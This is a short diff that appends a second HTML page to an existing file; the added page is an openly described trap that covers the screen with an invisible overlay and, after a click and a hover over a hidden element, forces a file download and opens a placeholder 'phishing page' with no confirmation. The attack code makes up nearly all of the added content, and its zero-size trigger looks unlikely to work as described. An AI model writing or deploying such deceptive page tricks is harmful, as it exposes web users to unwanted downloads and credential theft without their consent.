@@ -23,3 +23,40 @@
     </script>
   </body>
 </html>
+<!DOCTYPE html>
+<html>
+  <body>
+    <p>Click anywhere, then hover over the invisible area to trigger a **forced PDF download** or a **phishing page** without any additional confirmation.</p>
+
+    <!-- Invisible area that triggers the action -->
+    <div id="trap" style="width:100vw; height:100vh; position:absolute; top:0; left:0;">
+      <div id="hiddenTrigger" style="position:absolute; top:50%; left:50%; width:0; height:0; background:transparent;"></div>
+    </div>
+
+    <script>
+      let isClick = false;
+
+      // Activate action upon any click on the page
+      document.body.addEventListener('click', () => {
+        isClick = true;
+      });
+
+      // Once the hidden element is hovered, trigger the unwanted action (forced PDF download or phishing)
+      document.getElementById('hiddenTrigger').addEventListener('mouseenter', () => {
+        if (isClick) {
+          // Example: Forced PDF download (replace with an actual PDF link)
+          const a = document.createElement('a');
+          a.href = 'https://www.adobe.com/support/products/enterprise/pdfs/acrobatpro.pdf'; // Example: Link to an Adobe PDF
+          a.download = 'acrobatpro.pdf';  // Initiates the download
+          a.click();
+
+          // Example: Open phishing page
+          window.open('https://example.com/phishing-page', '_blank');
+
+          isClick = false;  // Prevent triggering more than once
+        }
+      });
+    </script>
+  </body>
+</html>
+
